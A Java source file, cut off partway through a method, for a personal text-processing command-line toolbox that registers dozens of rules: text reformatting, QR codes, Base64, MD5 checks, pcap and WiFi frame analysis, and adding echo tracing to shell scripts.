
import cn.hutool.core.date.DateUtil;
import cn.hutool.core.map.MapUtil;
import cn.hutool.core.util.RuntimeUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.core.util.ByteUtil;
import cn.hutool.extra.qrcode.BufferedImageLuminanceSource;
import cn.hutool.extra.qrcode.QrCodeUtil;
import cn.hutool.extra.qrcode.QrConfig;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONUtil;
import cn.hutool.system.JavaRuntimeInfo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.google.common.base.Ascii;
import com.google.common.primitives.Bytes;
import com.google.zxing.BinaryBitmap;
import com.google.zxing.EncodeHintType;
import com.google.zxing.MultiFormatReader;
import com.google.zxing.Result;
import com.google.zxing.common.HybridBinarizer;

import net.sourceforge.pinyin4j.PinyinHelper;
import net.sourceforge.pinyin4j.format.HanyuPinyinCaseType;
import net.sourceforge.pinyin4j.format.HanyuPinyinOutputFormat;
import net.sourceforge.pinyin4j.format.HanyuPinyinToneType;
import net.sourceforge.pinyin4j.format.exception.BadHanyuPinyinOutputFormatCombination;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.io.*;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.CharBuffer;

import java.math.BigInteger;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.nio.charset.Charset;

import javax.crypto.Mac;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.MessageDigest;

import org.apache.commons.io.FileUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.helper.Validate;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.interactions.Actions;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.image.BufferedImage;

import java.math.BigDecimal;

import java.net.*;

import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.BasicFileAttributes;

import java.text.Collator;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPInputStream;

//
public class I9_TextRuleOperation {

	/******************* 修改属性列表 ------Begin *********************/
// 修改0.   全局修改 把 I9 改为当前应用的序号规则序号  当前类名称也需要修改
// 修改1.当前 执行代码的 bat sh 文件名称  最后必须是标识序号
	// 修改2. I9_TextRuleOperation 改为当前类名称 A1 Z9
	// 修改2.1 I9 改为 对应的 标识符
// 修改3.  当前是否有默认的规则   如果有默认的规则那么设置 CUR_TYPE_INDEX为对应index , 没有默认规则那么设置为默认的1
	static String Cur_Bat_Name = "ztextrule_operation_I9";
	// 当前用户选中的 操作的类型 0-默认标识没有选中打印帮助字符串 1-标识选中默认规则1
	static int CUR_TYPE_INDEX = 1;
	static boolean allowEmptyInputParam = false; // 是否允许输入参数为空 执行 rule的apply方法

	/******************* 修改属性列表 ------End *********************/
	static String Default_Selected_Rule_Index_Key = "Default_Selected_Rule_Index_Key";

	/******************* 固定属性列表 ------Begin *********************/
//  固定属性列表 ------Bargs[egin
//固定1  zbin 的 字符串绝对路径
	static String zbinPath = System.getProperties().getProperty("user.home") + File.separator + "Desktop"
			+ File.separator + "zbin";

	static String cur_os_zbinPath;
	static String win_zbinPath = System.getProperties().getProperty("user.home") + File.separator + "Desktop"
			+ File.separator + "zbin" + File.separator + "win_zbin";
	static String lin_zbinPath = System.getProperties().getProperty("user.home") + File.separator + "Desktop"
			+ File.separator + "zbin" + File.separator + "lin_zbin";
	static String mac_zbinPath = System.getProperties().getProperty("user.home") + File.separator + "Desktop"
			+ File.separator + "zbin" + File.separator + "mac_zbin";

	// 固定2 当前执行文件的编号 A1 A2 A3 ... G1 I9 G3 ... Z9
	static File I9_Properties_File = new File(
			System.getProperties().getProperty("user.home") + File.separator + "Desktop" + File.separator + "zbin"
					+ File.separator + get_Bat_Sh_FlagNumber(Cur_Bat_Name) + ".properties");


	static File I9_Temp_Text_File = new File(
			System.getProperties().getProperty("user.home") + File.separator + "Desktop" + File.separator + "zbin"
					+ File.separator + get_Bat_Sh_FlagNumber(Cur_Bat_Name) + "_Temp_Text.txt");

	static String I9_OUT_DIR_PATH = zbinPath + File.separator + "I9_Out";
	static File I9_OUT_DIR = new File(I9_OUT_DIR_PATH);
	static File I9_Qr_Black_Image_File = new File(zbinPath + File.separator + "I9_Qr_Black.jpg");
	static InputStream I9_Properties_InputStream;
	static OutputStream I9_Properties_OutputStream;
	static Properties I9_Properties = new Properties();
	static Map<String, String> propKey2ValueList = new HashMap<String, String>();

	// 当前Shell目录下的 文件类型列表 抽取出来 通用
	static HashMap<String, ArrayList<File>> CurDirFileTypeMap = new HashMap<String, ArrayList<File>>();;

	public static int Rule6_num_row = 0; // 每行重组的个数
	// 固定3 当前操作系统的类型
	static OS_TYPE CUR_OS_TYPE = OS_TYPE.Windows;
	static String BAT_OR_SH_Point;
	// 固定4 从CMD窗口输入得到的 目录关键字参数
	// 当前 SHELL 所在目录 默认是main中的第一个 arg[0] 就是shell路径
	static String CUR_Dir_1_PATH = ""; // arg[0] 就是shell路径 String 类型
	static File CUR_Dir_FILE; // 当前 CMDER的路径 File 文件
	static File First_Input_Dir; // 用户第一次可能输入的文件夹

	static File First_Input_RealFile; // 用户第一次可能输入的文件 实体文件

	// 固定5 从CMD窗口输入得到的 功能 tyoe 索引类型 以及依据索引 选中的 逻辑规则
	// 输入的第一个数值 是 rule的索引 同时搭配 * # 实现不同功能
	static String CUR_TYPE_2_ParamsStr; // arg[1] 就是输入的第一个参数 固定 通过 tip输出
	static boolean isDefaultOperation = false; // 是否是 默认的操作

	static Rule CUR_Selected_Rule; // 当前默认选中的 操作规则 这里实现了具体的操作逻辑

	// 固定6 从shell 中获取到的 除了 args[0] 和 args[1] 之外的所有其他的输入参数类型
	static ArrayList<String> CUR_INPUT_3_ParamStrList = new ArrayList<>();

	// 固定2 当前执行文件的编号 I9_preparam.properties    预制放置参数的地方
	static File I9_PreParam_Properties_File = new File(
			System.getProperties().getProperty("user.home") + File.separator + "Desktop" + File.separator + "zbin"
					+ File.separator + get_Bat_Sh_FlagNumber(Cur_Bat_Name)+"_"+"preparam" + ".properties");
	// 从  I9_preparam.properties prop里 读取  , 从 参数中设置到 properties  然后 传给 每个 rule
	// propname  可以是  1 2 3 4 5 //  开头的数据   value 是 从 预先 设置好的数据
	static ArrayList<String> I9_PreParam_PropValue_List = new ArrayList<>();
	static InputStream I9_PreParam_Properties_InputStream;
	static OutputStream I9_PreParam_Properties_OutputStream;
	static Properties I9_PreParam_Properties = new Properties();



	// 固定7 当前保存 Rule的集合
	static ArrayList<Rule> CUR_RULE_LIST = new ArrayList<Rule>(); // 规则的集合

	// 固定8 当前Shell目录下的 文件类型列表 抽取出来 通用 文件类型Str-文件及合
	static HashMap<String, ArrayList<File>> CUR_Dir_FILETypeMap = new HashMap<String, ArrayList<File>>();;

//  固定属性列表 ------End
	/******************* 固定属性列表 ------End *********************/

	// 检测中文 编码序列
	static String REGEX_CHINESE = "[\u4e00-\u9fa5]";

	// PATH 环境变量值进行当前的保存处理
	static String EnvironmentValue = System.getProperties().getProperty("java.library.path");
	static String PathSeparator = System.getProperties().getProperty("path.separator");
	static String[] EnvironmentList = EnvironmentValue.split(PathSeparator);

	static boolean isContainEnvironment(String program) {
		boolean environmentExist = false;
		if (EnvironmentValue.contains(program)) {
			environmentExist = true;
		}
		return environmentExist;
	}

	// ffmpeg -f concat -safe 0 -i C:\Users\zhuzj5\Desktop\zbin\I9_1_MergedRule.txt
	// -c copy C:\Users\zhuzj5\Desktop\output2.mp4
	// D:\software\ffmpeg\bin
	// D:\software\ffmpeg\bin\ffmpeg.exe -f concat -safe 0 -i
	// C:\Users\zhuzj5\Desktop\zbin\I9_1_MergedRule.txt -c copy
	// C:\Users\zhuzj5\Desktop\output3.mp4
	static String getEnvironmentExePath(String program) {
		String exename = program.trim().toLowerCase();
		String executePath = null;
		for (int i = 0; i < EnvironmentList.length; i++) {
			String itemPath = EnvironmentList[i];
			String itemPathLower = itemPath.toLowerCase();

			if (itemPathLower.contains(exename)) {
				executePath = itemPath + File.separator + program + (CUR_OS_TYPE == OS_TYPE.Windows ? ".exe" : "");
				break;
			}
		}

		return executePath;
	}

	static String getEnvironmentDefinePath(String program) {
		String exename = program.trim().toLowerCase();
		String executePath = null;
		for (int i = 0; i < EnvironmentList.length; i++) {
			String itemPath = EnvironmentList[i];
			String itemPathLower = itemPath.toLowerCase();

			if (itemPathLower.contains(exename)) {

				return itemPath;
			}
		}

		return executePath;
	}

	// A1 ..... A2.
	static String get_Bat_Sh_FlagNumber(String mCur_Bat_Name) {
		String mCharNumber = "error";
		String curBat = mCur_Bat_Name;
		if (mCur_Bat_Name.contains(".sh")) {
			curBat = curBat.replace(".sh", "");
		}

		if (mCur_Bat_Name.contains(".bat")) {
			curBat = curBat.replace(".bat", "");
		}
		if (curBat.contains("_")) {
			String[] arrNameList = curBat.split("_");
			mCharNumber = arrNameList[arrNameList.length - 1];
		} else {
			mCharNumber = curBat;
		}

		return mCharNumber;
	}

	static {
		try {

			if (!I9_OUT_DIR.exists()) {
				I9_OUT_DIR.mkdirs();
			}

			if (!I9_Temp_Text_File.exists()) {
				I9_Temp_Text_File.createNewFile();
			}

			if (!I9_Properties_File.exists()) {
				I9_Properties_File.createNewFile();
			}
			I9_Properties_InputStream = new BufferedInputStream(
					new FileInputStream(I9_Properties_File.getAbsolutePath()));
			I9_Properties.load(I9_Properties_InputStream);
			Iterator<String> it = I9_Properties.stringPropertyNames().iterator();
			while (it.hasNext()) {
				String key = it.next();
				if (key.equals(Default_Selected_Rule_Index_Key)) {
					CUR_TYPE_INDEX = Integer.parseInt(I9_Properties.getProperty(key));
				}
				// System.out.println("key:" + key + " value: " +
				// I9_Properties.getProperty(key));
				propKey2ValueList.put(key, I9_Properties.getProperty(key));
			}
			I9_Properties_InputStream.close();



			// 预制 参数的  设置
			if (!I9_PreParam_Properties_File.exists()) {
				I9_PreParam_Properties_File.createNewFile();
			}
			I9_PreParam_Properties_InputStream = new BufferedInputStream(
					new FileInputStream(I9_PreParam_Properties_File.getAbsolutePath()));
			I9_PreParam_Properties.load(I9_PreParam_Properties_InputStream);
			Iterator<String> it_param = I9_PreParam_Properties.stringPropertyNames().iterator();
			while (it_param.hasNext()) {
				String key = it_param.next();
				String  preparams = I9_PreParam_Properties.getProperty(key);

				I9_PreParam_PropValue_List.add(preparams); //  预制参数
			}
			I9_Properties_InputStream.close();





		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	static void setProperity() {
		try {
			I9_Properties_OutputStream = new BufferedOutputStream(
					new FileOutputStream(I9_Properties_File.getAbsolutePath()));
			I9_Properties.store(I9_Properties_OutputStream, "");
			I9_Properties_OutputStream.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}


	static void setProperity_PreParam() {
		try {
			I9_PreParam_Properties_OutputStream = new BufferedOutputStream(
					new FileOutputStream(I9_PreParam_Properties_File.getAbsolutePath()));
			I9_PreParam_Properties.store(I9_PreParam_Properties_OutputStream, "");
			I9_PreParam_Properties_OutputStream.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}


	enum OS_TYPE {
		Windows, Linux, MacOS
	}

	static boolean isFreshDefault_SelectedIndex = false;
	static String FreshDefaultInputStr = "";

	// 初始化 从 bat sh 传输而来的参数
	static void initInputParams(String[] args) {

		if(I9_PreParam_PropValue_List != null && I9_PreParam_PropValue_List.size() > 0 ) {

			for (int i = 0; i < I9_PreParam_PropValue_List.size(); i++) {
				System.out.println("pre_param["+i+"] = "+ I9_PreParam_PropValue_List.get(i));
			}
		}else {
			System.out.println("pre_param_list   预制参数列表为空!! ");
		}

		System.out.println();
		if (args != null) {

			for (int i = 0; i < args.length; i++) {
				System.out.println("args[" + i + "] = " + args[i]);
			}

			for (int i = 0; i < args.length; i++) {
				System.out.println("exe_args[" + i + "] = " + args[i]);
				if (i == 0) { // 第一个参数永远是 当前 shell的目录
					CUR_Dir_1_PATH = args[i];
				} else if (i == 1) { // 第二个参数是用来 对 当前功能进行分类使用的
					if (args[i].contains("default_index_")) {
						FreshDefaultInputStr = args[i];
						isFreshDefault_SelectedIndex = true;
						return;
					}
					CUR_TYPE_2_ParamsStr = args[i];
					// zukgit1 计算得到 当前 索引的列表 首先遇到的第一个数字类型 1_2112 那就是索引1 附带参数 2112 temp_2_
					int userSelectedIndex = calculInputTypeIndex(CUR_TYPE_2_ParamsStr);
					if (userSelectedIndex != 0 && userSelectedIndex != CUR_TYPE_INDEX) {
						// 如果 当前 的操作规则 不是 0 并且 操作索引 和当前 索引 不一样 那么就寻找赋值给 CUR_TYPE_INDEX
						CUR_TYPE_INDEX = userSelectedIndex;
						isDefaultOperation = false;
					} else if (userSelectedIndex == CUR_TYPE_INDEX) {
						// 显式的输入默认值
						isDefaultOperation = true; // 默认的操作
						CUR_TYPE_2_ParamsStr = CUR_TYPE_INDEX + "";
					} else {
						isDefaultOperation = true; // 默认的操作
						// 默认的操作没有index 选项 所以 index1 就是参数
						CUR_INPUT_3_ParamStrList.add(args[i]);
						CUR_TYPE_2_ParamsStr = CUR_TYPE_INDEX + ""; // 默认参数 模拟的第二个参数
					}
				} else {

					if (args[i].contains("default_index_")) {
						FreshDefaultInputStr = args[i];
						isFreshDefault_SelectedIndex = true;    //  后面可能会有输入参数

// ztextrule_operation_I9.bat default_index_53  53_ssidmod_fafa  53_threadcount_100  53_bssidmod_ffffffff 53_crackorder_12345
//   把 一个 列表 保存到 prop ?
						return;
					}
					CUR_INPUT_3_ParamStrList.add(args[i]); // 当前cmd目录 第一个类型选项 之后所有的参数 保存在 CUR_INPUT_3_ParamStrList
					// Rule_Identify_TypeIndexList.add(args[i]);
				}

			}
		}

		File mCUR_Dir_FILE = new File(CUR_Dir_1_PATH);
		CUR_Dir_FILE = new File(CUR_Dir_1_PATH);

	}

	static void initSystemInfo() {
		String osName = System.getProperties().getProperty("os.name").toLowerCase();
		if (osName.contains("window")) {
			CUR_OS_TYPE = OS_TYPE.Windows;
			Cur_Bat_Name = Cur_Bat_Name + ".bat";
			BAT_OR_SH_Point = ".bat";
			cur_os_zbinPath = win_zbinPath;
		} else if (osName.contains("linux")) {
			CUR_OS_TYPE = OS_TYPE.Linux;
			Cur_Bat_Name = Cur_Bat_Name + ".sh";
			BAT_OR_SH_Point = ".sh";
			cur_os_zbinPath = lin_zbinPath;
		} else if (osName.contains("mac")) {
			CUR_OS_TYPE = OS_TYPE.MacOS;
			Cur_Bat_Name = Cur_Bat_Name + ".sh";
			BAT_OR_SH_Point = ".sh";
			cur_os_zbinPath = mac_zbinPath;
		}
	}

	public static String clearChinese(String lineContent) {
		if (lineContent == null || lineContent.trim().isEmpty()) {
			return null;
		}
		Pattern pat = Pattern.compile(REGEX_CHINESE);
		Matcher mat = pat.matcher(lineContent);
		return mat.replaceAll(" ");
	}

	void InitRule() {

		// 加入类型一一对应的 那些 规则
		CUR_RULE_LIST.add(new OnlyGetFirstStr_InOneLine_Rule_1());
		CUR_RULE_LIST.add(new OnlyGetFirstStr_AsOneLine_Rule_2());
		CUR_RULE_LIST.add(new AddLineNumberChar_Rule_3());
		CUR_RULE_LIST.add(new ClearChinese_Rule_4());
		CUR_RULE_LIST.add(new Duiqi_Hang_Rule_5());
		CUR_RULE_LIST.add(new PaiLie_2x2_Rule_6());
		CUR_RULE_LIST.add(new PaiLie_3x3_Rule_7());
		CUR_RULE_LIST.add(new PaiLie_4x4_Rule_8());
		CUR_RULE_LIST.add(new PaiLie_5x5_Rule_9());
		CUR_RULE_LIST.add(new Add_BeginStr_EndStr_Rule_10());
		CUR_RULE_LIST.add(new Table_MDStyle_Rule_11());
		CUR_RULE_LIST.add(new BoardCopy_ToLeft_Rule_12());
		CUR_RULE_LIST.add(new ClearChinese_Rule_13());
		CUR_RULE_LIST.add(new Chinese_To_PinYin_Rule_14());
		CUR_RULE_LIST.add(new TextAs_QrCode_Rule_15());
		CUR_RULE_LIST.add(new Image2QrCode_Rule_16()); // 读取当前目录下的照片 并在临时文件显示 二维码信息
		CUR_RULE_LIST.add(new Make_Json_As_JavaFile_Graphviz2Jpg_Rule_17());
		CUR_RULE_LIST.add(new Add_BeginStr_EndStr_Rule_18());
		CUR_RULE_LIST.add(new FirstWord_MakeDir_Rule_19());
		CUR_RULE_LIST.add(new Cal_Install_Command_Rule_20());
		CUR_RULE_LIST.add(new System_Out_Print_Rule_21()); // 把当前文件的每一行 都 转为 System.out.println(xx) 的内容
		CUR_RULE_LIST.add(new ADB_Wireless_WIFI_Rule_22()); // 把 输入的四个参数 转为 无线 adb 连接的命令
		CUR_RULE_LIST.add(new Create_Install_Command_Rule_23()); // 把当前目录的 exe 和 msi 输出 安装的 zbat_xxxx.bat 命令 测试安装命令
		CUR_RULE_LIST.add(new ReadStrFromFile_Rule_24());
		CUR_RULE_LIST.add(new LS_Shell_RealFile_Rule_25()); // //读取当前文件下的 实体文件的文件名称 输出到列表中
		CUR_RULE_LIST.add(new Fliter_Copy_File_WithName_Rule_26()); // //读取当前文件的内容 并在当前文件夹下内寻找该文件 复制到指定目录
		CUR_RULE_LIST.add(new Copy_Port_WithZ_Rule27()); // 把当前文件内容以 ZZZZZZZZZZZZZZZZZZZZZ 分割 专门生成剪切内容保存到零时txt文件
		CUR_RULE_LIST.add(new Show_JavaTest_File_Rule_28()); // 读取 Java模板文件(包含初始化模块) 然后在notepad++打开它
		CUR_RULE_LIST.add(new Bat_Revert_MD_Rule29()); // 读取当前.bat 文件内容 进行 解析生成 MD文件的下半部分 并会解析新增的Method到模板文件
		// zzbattest_I9.bat
		CUR_RULE_LIST.add(new Show_Bat_Template_OnDir_Rule_30()); // 把当前模板文件 zzbattest_I9.bat 内容写进当前目录下 Test_xx.bat文档
		// 并打开它
		CUR_RULE_LIST.add(new Bat_Format_Rule_31()); // 对当前 bat 文件进行 format 如果不是bat文件不操作 增项假如模板zbatrule_I9_Rule30.bat中
		CUR_RULE_LIST.add(new Build_SH_BAT_WithJavaWithJar_Rule_32());

		// 读取当前文件的每一个字符串 截取每一个字符作为单独的字符串然后复制120份
		CUR_RULE_LIST.add(new MakeStringAsOneString_Copy120AsLine_Rule_33());

		// 读取当前页面的每一行 只留下 颜色的值 并 生成 android的 列表
		CUR_RULE_LIST.add(new Select16Color2Android_Rule_34());

		// 把当前 notepad 打开的文件 转为 二进制格式 即 zbyte_file_F9.bat 的规则 集成进 TextRule
		CUR_RULE_LIST.add(new FileToByte_F9_Rule_35());

		// 对于只包含 0 和 1 的字符串文件 转为一个 byte文件 在 txt中打开
		CUR_RULE_LIST.add(new BinaryStrToFile_Rule_36());

		// 对于只包含 十六进制的 数值的文件 转为字节 转为一个 byte文件 并依据魔数 进行还原数据 在 txt中打开 对只包含 0 ， 1 字符串的补充

		CUR_RULE_LIST.add(new HexNumberStrToFile_Rule_37()); // 十六进制的 数值的文件 转为 字节文件

		// 去除在PC微信中多选复制文本出现的多余内容 只保留有用信息的规则
		CUR_RULE_LIST.add(new Fixed_PCWeCharContent_KeepUsedInfo_Rule_38());

		// 检测当前目录下 包括 所有 子目录 孙 目录下 的 txt 文件 把 内容集中到 一个文件中 按时间顺序排序 并过滤url出来
		CUR_RULE_LIST.add(new MakeAllTxt_Content_To_OneFile_Rule_39());

		// 把 当前的 每一行 转为 md 格式的 ``` oneline ``` 格式 方便放入 网站 之后 安卓 ios 都能快捷复制
		CUR_RULE_LIST.add(new MakeOneLine_As_BlockWith_MD_Format_Rule_40());

		// 把 当前的 所有 内容 都 转为 1 行的 内容
		CUR_RULE_LIST.add(new MakeContent_As_OneLine_Rule_41());

		// 去除当前空白的一行 使得文本紧凑
		CUR_RULE_LIST.add(new Clear_Blank_Line_Rule_42());

		// 对python代码的 格式进行格式化使得符合编译要求进格为4 8 12 16,不能有 tab 制表符
		CUR_RULE_LIST.add(new Format_PythonCode_Rule_43());

		// 对当前文件过来 去掉 行开头是空格的 那些行 保留 行开头就是描述的那些行 adb dumpsys 中查看主项
		CUR_RULE_LIST.add(new NoBlankBeginRow_Flitter_Rule44());
		// 开头两行是空格第三个不是空格的 行
		CUR_RULE_LIST.add(new TwoBlankBeginRow_Flitter_Rule45());

		// 对当前的文字符串进行 Base 64 的 加密输出
		CUR_RULE_LIST.add(new String_To_Base64__Rule46());

		// 依据当前每行的字符串 羽 每个文件的md5去判断 如果文件的md5包含在输入字符串行中 那么删除这个文件
		CUR_RULE_LIST.add(new Delete_File_WithMD5_Rule_47());

		// 读取当前所有的子目录 子文件夹下的文件生成 md5 字符串到 txt 中
		CUR_RULE_LIST.add(new Read_File_ToMD5_Rule_48());

		// 去除当前分析Log文件中的提示中信息,读取 J9_I9_Dynamic_ClearDesc.txt 并过滤当前每一行
		// jira comment 中 有要求 尽量不写中文
		CUR_RULE_LIST.add(new Clear_Wisl_Chinese_Tip_Rule_49());

		// 对于 avc denied 这类的 权限问题 计算解决的 .te 中 allow platform_app
		// default_android_service:service_manager find; 的 表达式
		// 对于 SELinux : avc: denied { find } for pid=27266 uid=10108
		// name=motorola.hardware.sarwifi.IMtkWifi/default
		// scontext=u:r:platform_app:s0:c512,c768
		// tcontext=u:object_r:default_android_service:s0 tclass=service_manager
		// permissive=0
		CUR_RULE_LIST.add(new Avc_Deny_ShowFix_Rule_50());

		// .pcap tcpdump 包 帧的分析
		CUR_RULE_LIST.add(new PcaP_TcpDump_Frame_Analysis_Rule_51());

		// 打开 研究 WIFI EAPOL 交互帧研究的 txt 文件 和 pcapng 文件
		CUR_RULE_LIST.add(new PcaPng_TXT_WifiFrame_ByteShow_Rule_52());

		// .pcapng wifi 包 文件解析 对wifi包的分析 待开发
		CUR_RULE_LIST.add(new PcaPng_Wifi_Frame_Analysis_Rule_53());

		// 当前 txt 文件内容的 twitter的 id 进行集合
		CUR_RULE_LIST.add(new Twitter_ID_Search_Rule_54());
		// 检测 当前 txt文件中的 url 路径 并尝试下载这个 url 对应的文件到本地
		// 检测当前的 txt文件 只 保留 url 内容 , 并 对这些 内容 进行 排序 在 temp 中 打印出来
		CUR_RULE_LIST.add(new Analysis_URI_IN_Txt_Download_DouYinMP4_Rule_55());


		// 在当前的 md 文件中 把 # 号 里面 转为 # 1.   ## --> ## 2.   ###### --> ###### 6.
		CUR_RULE_LIST.add(new MD_File_Head_JingHao_AddIndex_Rule_56());


		// 在当前的中的文件 .c .cpp .java  .txt 等转为 一个 codeblock 写入 MD 文件
		CUR_RULE_LIST.add(new RealFile_To_MD_CodeBlock_Rule_57());


		//  把当前的 变量表达式  等号前的 值 转为  echo 类型的输出
		// gen_fact_package=0
		//echo "$ {gen_fact_package}=${gen_fact_package}"
		CUR_RULE_LIST.add(new Bash_Var_To_Echo_Rule_58());


		//  把当前 bash  文件 和 sh 文件  空格插入echo  追踪 打印数据  然后 查看 执行 调用过程
		// gen_fact_package=0
		//echo "$ {gen_fact_package}=${gen_fact_package}"
		CUR_RULE_LIST.add(new Add_Echo_Log_To_SH_BASH_Rule_59());


	}

	class Add_Echo_Log_To_SH_BASH_Rule_59 extends Basic_Rule {


		@Override
		String simpleDesc() {
			return "  把当前 bash  文件 和 sh 文件  空格插入echo  追踪 打印数据  然后 查看 执行 调用过程  ";
		}

		Add_Echo_Log_To_SH_BASH_Rule_59() {
			super(59, false);
		}


		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				String file_name = fileItem.getName();

				if(!file_name.toLowerCase().endsWith(".sh") && !file_name.toLowerCase().endsWith(".bash") ) {

					System.out.println("当前文件 不是  sh 文件 或者 bash  文件 无法执行  添加 echo 打印变量的操作  请检查!");

					return null;
				}

//                ArrayList<String>  fixedStrArr =   clearChinese_Rule_13(fileItem);
				ArrayList<String> fixedStrArr = Bash_Sh_File_Add_Echo(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->  把当前文件的 等号表达式=  都 转为 echo ${ var } = ${var} 的内容   File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}


		public  ArrayList<String> Bash_Sh_File_Add_Echo(File srcFile) {

			return Bash_Sh_File_Add_Echo(srcFile,false);
		}


		public  ArrayList<String> Bash_Sh_File_Add_Echo(File srcFile , boolean isFullname) {
			ArrayList<String> newListContent = new ArrayList<String>();

			File curFile = srcFile;

			String file_name = curFile.getName();
			if(isFullname) {
				file_name =  curFile.getAbsolutePath();
			}
			String operation_timestamp =getTimeStamp_yyyyMMdd_HHmmss();

			int echo_count = 1;
			if (curFile != null) {

				FileReader curReader;
				try {

					curReader = new FileReader(curFile);

					BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
					String oldOneLine = "";
					String newOneLine = "";
					String pre_one_line = "";


					while (oldOneLine != null) {

						oldOneLine = curBR.readLine();

						if(!newOneLine.contains("zukgit")) {  // 修改 老的 上一句  会被 echo代替
							pre_one_line = newOneLine;
						}

						if (oldOneLine == null || oldOneLine.trim().isEmpty()) {
							newListContent.add("");
							continue;
						}

//	                    System.out.println(" \"this is test string\" ");
//	                    System.out.println("adb shell am broadcast -a com.Android.test --es<string> test_string \"this is test string\" —ei<int> test_int 100 —ez<boolean> test_boolean true");
						newOneLine = new String(oldOneLine).trim();

						//1.注释
						if(newOneLine.contains("zukgit")) {  //  如果当前行 包含 zukgit  那么是旧的 打印  不理它 直接跳过  继续检测下一行
							continue;
						}

						//1.注释
						if(newOneLine.startsWith("#")) {  // 以 # 开头 是注释  直接 跳过

							newListContent.add(newOneLine);
							continue;
						}


						// 最后是以 " 或者 \ 结尾的  不操作
						//echo zukgit_build_device_old.bash_479  "$ {build_int_files}=${build_int_files}"
						// ramdisk-recovery.img \

						//1. 不包含 等号 而且是以 \ 和  为 结尾 说明 可能是 多行操作   不执行 打印操作
						// fuck 这里 " 为结尾 不能 这样写
						if( (newOneLine.endsWith("\\") ))   {  // 以 \   为 结尾 开头 是多行  直接 跳过

							newListContent.add(newOneLine);
							continue;
						}

						// 当前 只有 一个 引号  那么 也 跳过
						if( (newOneLine.endsWith("\"")) && ( newOneLine.indexOf("\"") == newOneLine.lastIndexOf("\"") ))   {  // 以 \   为 结尾 开头 是多行  直接 跳过

							newListContent.add(newOneLine);
							continue;
						}






						// 只对 包含 = 等号的 变量进行输出
						//  script_name=$(basename ${script_path})   不以 if 开头  只有 一个 等号
						//2. 只有一个等号的 赋值 的 表达式的处理
						if(!newOneLine.startsWith("if")
								&& !newOneLine.contains("!=")
								&& newOneLine.contains("=")
								&& newOneLine.indexOf("=") == newOneLine.lastIndexOf("=") ) {
							String equal_var_str = newOneLine.substring(0,newOneLine.indexOf("=")).trim();

							if(equal_var_str.contains(" ")) {  //  // 如果 变量名称中 含有 空格那么 就不打印它了
								newListContent.add(newOneLine);
								continue;
							}

							String echo_var_command = "echo zukgit_"+file_name+"_"+echo_count+"_"+operation_timestamp+"  "+"\"$ {"+equal_var_str+"}=${"+equal_var_str+"}\"";
							echo_count++;
							newListContent.add(newOneLine);
							newListContent.add(echo_var_command);
							continue;
						}


						//3. 方法的内部  那么打印调用的方法
						//function release_build_info {    并且是 以 { 为结尾的 方法  否则 报错
						if(newOneLine.startsWith("function ") && newOneLine.endsWith("{")) {

							String function_name = newOneLine.replace("{", "").replace("}", "").replace("(", "").replace(")", "").replace("function", "zfunc").trim();
							String method_echo_command =  "echo zukgit_"+file_name+"_"+echo_count+"_"+operation_timestamp+"  "+" ______func_begin___________ "+function_name+" ___________";
							echo_count++;
							newListContent.add(newOneLine);
							newListContent.add(method_echo_command);
							continue;
						}


						// 如果当前语句中有变量  那么 获取 所有的变量的名字  并打印
						//          cp ${RBE_log_dir}/rbe_metrics.* ${build_info_dir}/ || true
						//4.
						// 4.1 如果当前 不是以 \ 为 结尾  但 包含${   , 那么 要
						// 	cp -f ${BUILD_SCRIPT_DIR}/boot/QcomPkg/SocPkg/Palima/Common/uefipil_oneli.cfg \
						//	${BUILD_SCRIPT_DIR}/boot/QcomPkg/SocPkg/Palima/Common/uefipil.cfg

						if(newOneLine.contains("${")) {
							String[] var_arr = newOneLine.split("\\$\\{");
							if(var_arr == null) {
								newListContent.add(newOneLine);
								continue;
							}

							ArrayList<String> var_list = new ArrayList<String>();
							for (int i = 0; i < var_arr.length; i++) {
								String varItem = var_arr[i]+" ";;

								if(i == 0) {   // 第一个分隔项 是 没有匹配的
									continue;
